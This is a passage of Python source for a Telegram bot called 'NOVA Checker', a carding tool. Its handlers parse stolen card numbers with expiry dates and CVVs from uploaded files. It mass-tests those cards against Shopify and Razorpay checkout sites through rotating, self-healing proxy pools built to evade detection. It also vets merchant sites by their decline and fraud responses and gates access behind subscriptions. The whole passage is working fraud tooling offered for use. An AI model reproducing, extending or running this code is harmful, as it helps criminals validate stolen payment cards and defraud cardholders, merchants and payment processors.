            data[g].append(p)
            new_count += 1
    save_user_proxies(uid, data)

    safe_send(bot.edit_message_text,
        f"<b>✅ PROXY UPLOAD DONE</b>\n"
        f"━━━━━━━━━━━━━━━━\n"
        f"Tested: {tested}\n"
        f"✅ Reachable: {len(live)}\n"
        f"➕ New: {new_count}\n"
        f"🛍️ Shopify: {len(data['shopify'])}\n"
        f"💎 Razorpay: {len(data['razorpay'])}\n\n"
        f"<i>Run /addurls — preflight will re-test before validation.</i>",
        message.chat.id, status.message_id, parse_mode='HTML')


# ═══════════════════════════════════════════════════════════════════
# MSH
# ═══════════════════════════════════════════════════════════════════
def _run_msh(message, raw):
    uid = message.from_user.id
    ccs = []
    for line in raw.splitlines():
        line = line.strip()
        if not line or line.startswith('#'):
            continue
        m = re.search(r'(\d{13,19})[|:/\s](\d{1,2})[|:/\s](\d{2,4})[|:/\s](\d{3,4})', line)
        if m:
            cc, mm, yyyy, cvv = m.groups()
            if len(yyyy) == 2: yyyy = "20" + yyyy
            ccs.append(f"{cc}|{mm.zfill(2)}|{yyyy}|{cvv}")
    if not ccs:
        safe_send(bot.reply_to, message, "❌ No valid cards.")
        return
    sites = sites_data.get('sites', [])
    if not sites:
        safe_send(bot.reply_to, message, "📭 No valid sites. Run /addurls first.")
        return
    proxies = get_active_proxies(uid, 'shopify') or []
    start = bot.reply_to(message, f"📦 Starting on {len(ccs)} cards…")
    try:
        process_shopify_mass_check(
            bot, message, start, ccs, sites, proxies,
            uid, load_json, save_json, USERS_FILE,
            hit_pref="both", dm_target_user_id=None)
    except Exception as e:
        logger.error(f"msh: {e}")
        safe_send(bot.send_message, message.chat.id, f"❌ {e}")


# ═══════════════════════════════════════════════════════════════════
# REVALIDATE POOL
# ═══════════════════════════════════════════════════════════════════
def _revalidate_pool(chat_id, uid, sites):
    global sites_data
    up = read_user_proxies(uid)
    raw_pool = up.get('shopify', [])
    if not raw_pool:
        safe_send(bot.send_message, chat_id,
            "⚠️ No proxies to re-validate with.", parse_mode='HTML')
        return

    live_pool = preflight_proxies(uid, chat_id, raw_pool)
    if not live_pool:
        safe_send(bot.send_message, chat_id,
            "❌ No live proxies after preflight.", parse_mode='HTML')
        return

    with _run_stats_lock:
        _run_stats["proxies_cooled_during_run"] = 0

    status = safe_send(bot.send_message, chat_id,
        f"🧹 Re-testing <b>{len(sites)}</b> sites…", parse_mode='HTML')
    tested = 0
    keep, drop, cap_new = [], 0, 0
    lock = threading.Lock()
    last_upd = time.time()

    def _w(s):
        for cc in SITE_VALIDATION_CCS:
            proxy = pick_good_proxy(uid)
            if not proxy:
                return s, CAT_NET_ERR, 'no proxy'
            try:
                api_resp = check_shopify_api(s['url'], cc, proxy,
                    all_proxies=live_pool, all_sites=[s['url']], max_attempts=1)
                if not api_resp or not isinstance(api_resp, dict):
                    record_proxy_failure(proxy)
                    continue
                rt, _st, gw = process_shopify_api_response(api_resp, '0.00')
                cat = classify_site_response(rt)
                if cat in VALID_CATEGORIES:
                    record_proxy_success(proxy, cat)
                    return s, cat, rt[:120]
                if cat == CAT_CAPTCHA:
                    record_proxy_failure(proxy)
                    return s, cat, rt[:120]
                if cat == CAT_NET_ERR:
                    record_proxy_failure(proxy)
                    continue
                with _fail_lock:
                    _fail_counts.pop(proxy, None)
                return s, cat, rt[:120]
            except Exception:
                record_proxy_failure(proxy)
                continue
        return s, CAT_NET_ERR, 'all failed'

    with ThreadPoolExecutor(max_workers=MAX_WORKERS) as ex:
        futs = [ex.submit(_w, s) for s in sites]
        for fut in as_completed(futs):
            tested += 1
            try:
                s, cat, resp = fut.result(timeout=90)
            except Exception:
                continue
            with lock:
                if cat in VALID_CATEGORIES:
                    s['category'] = cat
                    s['response'] = resp
                    s['validated_at'] = datetime.utcnow().isoformat()
                    keep.append(s)
                elif cat == CAT_CAPTCHA:
                    save_site_captcha(s['url'], resp)
                    cap_new += 1
                    drop += 1
                else:
                    drop += 1
            now = time.time()
            if now - last_upd >= 4:
                try:
                    safe_send(bot.edit_message_text,
                        f"🧹 {tested}/{len(sites)} · ✅ {len(keep)} · 🗑️ {drop} · "
                        f"🔒 cooled: {cooled_count()}",
                        chat_id, status.message_id)
                    last_upd = now
                except Exception:
                    pass

    sites_data['sites'] = keep
    save_json(SITES_FILE, sites_data)
    save_json(CAPTCHA_FILE, captcha_sites_data)
    safe_send(bot.edit_message_text,
        f"<b>🧹 REVALIDATION DONE</b>\n"
        f"✅ Kept: {len(keep)}\n"
        f"🗑️ Dropped: {drop}\n"
        f"🔒 CAPTCHA added: {cap_new}",
        chat_id, status.message_id, parse_mode='HTML')


# ═══════════════════════════════════════════════════════════════════
# START
# ═══════════════════════════════════════════════════════════════════
@bot.message_handler(commands=['start', 'help'])
def cmd_start(message):
    if not _sub_gate(message):
        return
    uid = message.from_user.id
    up = read_user_proxies(uid)
    with _verified_lock:
        v_count = sum(1 for p in up['shopify'] if p in verified_proxies)
    text = (
        f"<b>⚡ N O V A · C H E C K E R</b>\n\n"
        f"🌐 Valid sites: <b>{len(sites_data.get('sites', []))}</b>\n"
        f"🔒 CAPTCHA sites: <b>{len(captcha_sites_data.get('sites', []))}</b>\n"
        f"🛡️ Shopify proxies: <b>{len(up['shopify'])}</b> ({v_count} verified)\n"
        f"💎 Razorpay proxies: <b>{len(up['razorpay'])}</b>\n\n"

        f"<b>📁 SITES</b>\n"
        f"<code>/cleanfile</code> — extract URLs from junk\n"
        f"<code>/addurls</code> — validate URLs (3-CC, with preflight)\n"
        f"<code>/cleansites</code> — re-validate pool\n"
        f"<code>/listsites</code> — view valid pool\n"
        f"<code>/rmsites</code> — wipe all sites\n"
        f"<code>/listcap</code> — view CAPTCHA pool\n"
        f"<code>/clearcap</code> — wipe CAPTCHA pool\n\n"

        f"<b>🛡️ PROXIES</b>\n"
        f"<code>/uploadproxies</code> — file upload\n"
        f"<code>/addproxies ip:port:user:pass</code> — inline\n"
        f"<code>/cleanproxy</code> — retest, keep reachable\n"
        f"<code>/listproxies</code> — view with status\n"
        f"<code>/rmproxies</code> — wipe all proxies\n"
        f"<code>/resetfails</code> — clear fail counters\n"
        f"<code>/resetverified</code> — clear verified registry\n\n"

        f"<b>📦 MASS CHECK</b>\n"
        f"<code>/msh</code> — Shopify mass check\n"
        f"<code>/stop</code> — stop running validation\n\n"

        f"<b>VALID SITE RESPONSES:</b>\n"
        f"• FRAUD_SUSPECTED\n"
        f"• RISK_REJECTED\n"
        f"• CARD_DECLINED\n"
        f"• 3DS_AUTHENTICATION\n"
        f"• PROCESSING_ERROR\n\n"

        f"<b>SELF-HEALING:</b>\n"
        f"Preflight kills dead proxies in 5s.\n"
        f"3 fails → cool + demote.\n"
        f"Success → verify.\n\n"

        f"<i>⚡ NOVA · <a href='tg://user?id={DARKS_ID}'>Unknownop</a></i>"
    )
    safe_send(bot.reply_to, message, text, parse_mode='HTML')


@bot.callback_query_handler(func=lambda c: c.data == "check_subscription")
def cb_check_sub(call):
    try:
        bot.answer_callback_query(call.id)
    except Exception:
        pass
    if is_subscribed(call.from_user.id) or call.from_user.id in OWNER_ID:
        try:
            bot.answer_callback_query(call.id, "✅ Access granted!", show_alert=True)
        except Exception:
            pass
    else:
        try:
            bot.answer_callback_query(call.id, "❌ Join both first.", show_alert=True)
        except Exception:
            pass


# ═══════════════════════════════════════════════════════════════════
# /cleanfile
# ═══════════════════════════════════════════════════════════════════
@bot.message_handler(commands=['cleanfile'])
def cmd_cleanfile(message):
    if not _sub_gate(message):
        return
    _set_await(message.from_user.id, 'awaiting_cleanfile')
    safe_send(bot.reply_to, message,
        "<b>🧹 CLEANFILE</b>\n\n"
        "Send a <b>.txt</b> file with any text.\n"
        "I'll extract every <code>http(s)://</code> URL, dedupe, "
        "and send back a clean <b>.txt</b> ready for <code>/addurls</code>.",
        parse_mode='HTML')


# ═══════════════════════════════════════════════════════════════════
# /addurls
# ═══════════════════════════════════════════════════════════════════
@bot.message_handler(commands=['addurls', 'validatesites'])
def cmd_addurls(message):
    if not is_owner(message.from_user.id):
        safe_send(bot.reply_to, message, "🚫 Owner only.")
        return
    parts = message.text.split(maxsplit=1)
    if len(parts) >= 2 and 'http' in parts[1]:
        _run_site_validation(message, parts[1])
        return
    _set_await(message.from_user.id, 'awaiting_urls_file')
    safe_send(bot.reply_to, message,
        "<b>🧪 ADD & VALIDATE URLS</b>\n\n"
        "Send a <b>.txt</b> of URLs.\n\n"
        "Preflight first — dead proxies killed in 5s each.\n"
        "Then 3-CC validation with self-healing pool.\n\n"
        "Only these get saved:\n"
        "• FRAUD_SUSPECTED\n"
        "• RISK_REJECTED\n"
        "• CARD_DECLINED\n"
        "• 3DS_AUTHENTICATION\n"
        "• PROCESSING_ERROR\n\n"
        "CAPTCHA → /listcap. Rest dropped.",
        parse_mode='HTML')


# ═══════════════════════════════════════════════════════════════════
# /listsites
# ═══════════════════════════════════════════════════════════════════
@bot.message_handler(commands=['listsites', 'listsite'])
def cmd_listsites(message):
    sites = sites_data.get('sites', [])
    if not sites:
        safe_send(bot.reply_to, message, "📭 No valid sites.")
        return
    lines = []
    for i, s in enumerate(sites, 1):
        sid = s.get('id', '?')
        cat = s.get('category', '?')
        url = s.get('url', '')
        lines.append(f"{i}. [#{sid}] [{cat}] {url}")
    body = "\n".join(lines)
    if len(body) < 3500:
        safe_send(bot.reply_to, message,
            f"<b>🌐 VALID SITES ({len(sites)})</b>\n\n<pre>{html.escape(body)}</pre>",
            parse_mode='HTML')
    else:
        fname = f"sites_{message.chat.id}.txt"
        try:
            with open(fname, 'w', encoding='utf-8') as f:
                f.write(body)
            with open(fname, 'rb') as f:
                bot.send_document(message.chat.id, f, caption=f"🌐 {len(sites)} sites")
            os.remove(fname)
        except Exception:
            pass


# ═══════════════════════════════════════════════════════════════════
# /rmsites
# ═══════════════════════════════════════════════════════════════════
@bot.message_handler(commands=['rmsites', 'clearsites'])
def cmd_rmsites(message):
    global sites_data
    if not is_owner(message.from_user.id):
        safe_send(bot.reply_to, message, "🚫 Owner only.")
        return
    before = len(sites_data.get('sites', []))
    sites_data = {"sites": []}
    save_json(SITES_FILE, sites_data)
    safe_send(bot.reply_to, message,
        f"✅ Removed <b>{before}</b> sites. Pool empty.",
        parse_mode='HTML')


# ═══════════════════════════════════════════════════════════════════
# /cleansites
# ═══════════════════════════════════════════════════════════════════
@bot.message_handler(commands=['cleansites'])
def cmd_cleansites(message):
    if not is_owner(message.from_user.id):
        safe_send(bot.reply_to, message, "🚫 Owner only.")
        return
    sites = sites_data.get('sites', [])
    if not sites:
        safe_send(bot.reply_to, message, "📭 No sites to clean.")
        return
    _revalidate_pool(message.chat.id, message.from_user.id, sites)


# ═══════════════════════════════════════════════════════════════════
# /listcap + /clearcap
# ═══════════════════════════════════════════════════════════════════
@bot.message_handler(commands=['listcap', 'listcaptcha'])
def cmd_listcap(message):
    sites = captcha_sites_data.get('sites', [])
    if not sites:
        safe_send(bot.reply_to, message, "📭 No CAPTCHA sites.")
        return
    lines = [f"{i}. {s.get('url','')}" for i, s in enumerate(sites, 1)]
    body = "\n".join(lines)
    if len(body) < 3500:
        safe_send(bot.reply_to, message,
            f"<b>🔒 CAPTCHA SITES ({len(sites)})</b>\n\n<pre>{html.escape(body)}</pre>",
            parse_mode='HTML')
    else:
        fname = f"captcha_{message.chat.id}.txt"
        try:
            with open(fname, 'w', encoding='utf-8') as f:
                f.write(body)
            with open(fname, 'rb') as f:
                bot.send_document(message.chat.id, f, caption=f"🔒 {len(sites)} CAPTCHA sites")
            os.remove(fname)
        except Exception:
            pass


@bot.message_handler(commands=['clearcap'])
def cmd_clearcap(message):
    global captcha_sites_data
    if not is_owner(message.from_user.id):
        safe_send(bot.reply_to, message, "🚫 Owner only.")
        return
    before = len(captcha_sites_data.get('sites', []))
    captcha_sites_data = {"sites": []}
    save_json(CAPTCHA_FILE, captcha_sites_data)
    safe_send(bot.reply_to, message, f"✅ Cleared {before} CAPTCHA sites.")


# ═══════════════════════════════════════════════════════════════════
# /uploadproxies
# ═══════════════════════════════════════════════════════════════════
@bot.message_handler(commands=['uploadproxies'])
def cmd_uploadproxies(message):
    if not _sub_gate(message):
        return
    _set_await(message.from_user.id, 'awaiting_proxy_file')
    safe_send(bot.reply_to, message,
        "<b>📂 UPLOAD PROXIES</b>\n\n"
        "Send a <b>.txt</b> — one per line:\n"
        "<code>ip:port</code>\n<code>ip:port:user:pass</code>\n\n"
        "Optional: add <code> shopify</code> or <code> razorpay</code> at the end.",
        parse_mode='HTML')


# ═══════════════════════════════════════════════════════════════════
# /addproxies
# ═══════════════════════════════════════════════════════════════════
@bot.message_handler(commands=['addproxies', 'addpro', 'addproxy'])
def cmd_addproxies(message):
    if not _sub_gate(message):
        return
    if not is_user_allowed(message.from_user.id) and not is_owner(message.from_user.id):
        safe_send(bot.reply_to, message, "🚫 Premium required.")
        return
    parts = message.text.split(maxsplit=1)
    if len(parts) < 2:
        _set_await(message.from_user.id, 'awaiting_proxy_file')
        safe_send(bot.reply_to, message,
            "<b>📂 ADD PROXIES</b>\n\n"
            "Send a <b>.txt</b>:\n<code>ip:port:user:pass</code>\n\n"
            "Or inline: <code>/addproxies ip:port:user:pass</code>",
            parse_mode='HTML')
        return
    raw = parts[1].strip()
    gate = "shopify"
    tokens = raw.split()
    if len(tokens) >= 2 and tokens[-1].lower() in ('shopify', 'razorpay'):
        gate = tokens[-1].lower(); raw = " ".join(tokens[:-1])
    norm = normalize_proxy(raw)
    if not norm:
        safe_send(bot.reply_to, message, "❌ Invalid format.")
        return
    if not test_proxy_connectivity(norm, timeout=8):
        safe_send(bot.reply_to, message,
            f"❌ Unreachable: <code>{html.escape(norm)}</code>", parse_mode='HTML')
        return
    uid = message.from_user.id
    up = read_user_proxies(uid)
    if norm in up[gate]:
        safe_send(bot.reply_to, message,
            f"⚠️ Already in {gate} pool.", parse_mode='HTML')
        return
    up[gate].append(norm)
    save_user_proxies(uid, up)
    safe_send(bot.reply_to, message,
        f"✅ Added to <b>{gate}</b>\n<code>{html.escape(norm)}</code>\n"
        f"Pool: <b>{len(up[gate])}</b>",
        parse_mode='HTML')


# ═══════════════════════════════════════════════════════════════════
# /listproxies
# ═══════════════════════════════════════════════════════════════════
@bot.message_handler(commands=['listproxies', 'listproxy'])
def cmd_listproxies(message):
    uid = message.from_user.id
    up = read_user_proxies(uid)
    if not up['shopify'] and not up['razorpay']:
        safe_send(bot.reply_to, message, "📭 No proxies saved.")
        return

    def fmt(lst, cap=15):
        if not lst:
            return "  (empty)"
        out = []
        for p in lst[:cap]:
            if is_proxy_verified(p):
                mark = "✅"
            elif is_proxy_cooled(p):
                mark = "⏳"
            else:
                mark = "🟢"
            fc = get_fail_count(p)
            suffix = f" (fails:{fc})" if fc else ""
            out.append(f"  {mark} {p}{suffix}")
        if len(lst) > cap:
            out.append(f"  … and {len(lst) - cap} more")
        return "\n".join(out)

    text = (
        f"<b>🌐 YOUR PROXIES</b>\n\n"
        f"✅ verified · 🟢 live · ⏳ cooling\n"
        f"🔒 cooling count: <b>{cooled_count()}</b>\n\n"
        f"🛍️ <b>Shopify</b> ({len(up['shopify'])})\n"
        f"<pre>{html.escape(fmt(up['shopify']))}</pre>\n\n"
        f"💎 <b>Razorpay</b> ({len(up['razorpay'])})\n"
        f"<pre>{html.escape(fmt(up['razorpay']))}</pre>"
    )
    if len(text) > 3900:
        body = "\n".join(f"{p}" for p in up['shopify'] + up['razorpay'])
        fname = f"proxies_{uid}.txt"
        try:
            with open(fname, 'w', encoding='utf-8') as f:
                f.write(body)
            with open(fname, 'rb') as f:
                bot.send_document(uid, f, caption="Your proxies")
            os.remove(fname)
        except Exception:
            pass
    else:
        safe_send(bot.reply_to, message, text, parse_mode='HTML')


# ═══════════════════════════════════════════════════════════════════
# /cleanproxy + /cleanproxies
# ═══════════════════════════════════════════════════════════════════
@bot.message_handler(commands=['cleanproxy', 'cleanproxies'])
def cmd_cleanproxy(message):
    if not _sub_gate(message):
        return
    uid = message.from_user.id
    up = read_user_proxies(uid)
    all_p = list(dict.fromkeys(up['shopify'] + up['razorpay']))
    if not all_p:
        safe_send(bot.reply_to, message, "📭 No proxies.")
        return
    status = bot.reply_to(message, f"🧹 Testing {len(all_p)} proxies…")
    tested, live = 0, []
    lock = threading.Lock()
    last_upd = time.time()

    def _w(p): return p, test_proxy_connectivity(p, timeout=8)

    with ThreadPoolExecutor(max_workers=100) as ex:
        futs = [ex.submit(_w, p) for p in all_p]
        for fut in as_completed(futs):
            tested += 1
            try:
                p, ok = fut.result(timeout=20)
            except Exception:
                continue
            if ok:
                with lock: live.append(p)
            now = time.time()
            if now - last_upd >= 3:
                try:
                    safe_send(bot.edit_message_text,
                        f"🧹 {tested}/{len(all_p)} · ✅ {len(live)}",
                        message.chat.id, status.message_id)
                    last_upd = now
                except Exception:
                    pass

    up['shopify'] = live
    up['razorpay'] = []
    save_user_proxies(uid, up)
    safe_send(bot.edit_message_text,
        f"<b>✅ CLEANED</b>\n\nLive: {len(live)} / {len(all_p)}",
        message.chat.id, status.message_id, parse_mode='HTML')


# ═══════════════════════════════════════════════════════════════════
# /rmproxies
# ═══════════════════════════════════════════════════════════════════
@bot.message_handler(commands=['rmproxies', 'clearproxies'])
def cmd_rmproxies(message):
    if not _sub_gate(message):
        return
    uid = str(message.from_user.id)
    before = user_proxies_data.get(uid, {"shopify": [], "razorpay": []})
    if isinstance(before, list):
        count = len(before)
    else:
        count = len(before.get('shopify', [])) + len(before.get('razorpay', []))
    user_proxies_data[uid] = {"shopify": [], "razorpay": []}
    save_json(USER_PROXIES_FILE, user_proxies_data)
    safe_send(bot.reply_to, message,
        f"✅ Removed <b>{count}</b> proxies. Pools empty.",
        parse_mode='HTML')


# ═══════════════════════════════════════════════════════════════════
# /resetfails + /resetverified
# ═══════════════════════════════════════════════════════════════════
@bot.message_handler(commands=['resetfails'])
def cmd_resetfails(message):
    if not is_owner(message.from_user.id):
        safe_send(bot.reply_to, message, "🚫 Owner only.")
        return
    with _fail_lock:
        n = len(_fail_counts)
        _fail_counts.clear()
    with _cooldown_lock:
        c = len(_cooldowns)
        _cooldowns.clear()
    safe_send(bot.reply_to, message,
        f"✅ Cleared <b>{n}</b> fail counters + <b>{c}</b> cooldowns.",
        parse_mode='HTML')


@bot.message_handler(commands=['resetverified'])
def cmd_resetverified(message):
    global verified_proxies
    if not is_owner(message.from_user.id):
        safe_send(bot.reply_to, message, "🚫 Owner only.")
        return
    with _verified_lock:
        n = len(verified_proxies)
        verified_proxies = {}
    save_json(VERIFIED_FILE, verified_proxies)
    safe_send(bot.reply_to, message,
        f"✅ Cleared <b>{n}</b> verified entries.",
        parse_mode='HTML')


# ═══════════════════════════════════════════════════════════════════
# /msh
# ═══════════════════════════════════════════════════════════════════
@bot.message_handler(commands=['msh'])
def cmd_msh(message):
    if not _sub_gate(message):
        return
    _set_await(message.from_user.id, 'awaiting_cards_file')
    safe_send(bot.reply_to, message,
        "<b>📦 SHOPIFY MASS</b>\n\n"
        "Send a <b>.txt</b> of cards:\n<code>CC|MM|YYYY|CVV</code>",
        parse_mode='HTML')


# ═══════════════════════════════════════════════════════════════════
# /stop
# ═══════════════════════════════════════════════════════════════════
@bot.message_handler(commands=['stop'])
def cmd_stop(message):
    uid = message.from_user.id
    if uid in validation_stop:
        validation_stop[uid] = True
        safe_send(bot.reply_to, message, "⏸️ Stop requested.")
    else:
        safe_send(bot.reply_to, message, "ℹ️ Nothing running.")


# ═══════════════════════════════════════════════════════════════════
# /verified
# ═══════════════════════════════════════════════════════════════════
@bot.message_handler(commands=['verified'])
def cmd_verified(message):
    with _verified_lock:
        v = dict(verified_proxies)
    if not v:
        safe_send(bot.reply_to, message, "📭 No verified proxies yet.")
        return
    lines = []
    for p, info in list(v.items())[:30]:
        cat = info.get('last_response', '?')
        lines.append(f"✅ {p} → {cat}")
    body = "\n".join(lines)
    safe_send(bot.reply_to, message,
        f"<b>✅ VERIFIED ({len(v)})</b>\n\n<pre>{html.escape(body)}</pre>",
        parse_mode='HTML')


# ═══════════════════════════════════════════════════════════════════
if __name__ == '__main__':
    logger.info("🚀 Bot starting…")
    while True:
        try:
            bot.infinity_polling(timeout=30, long_polling_timeout=25)
        except Exception as e:
            logger.error(f"Poll crash: {e}")
            time.sleep(5)
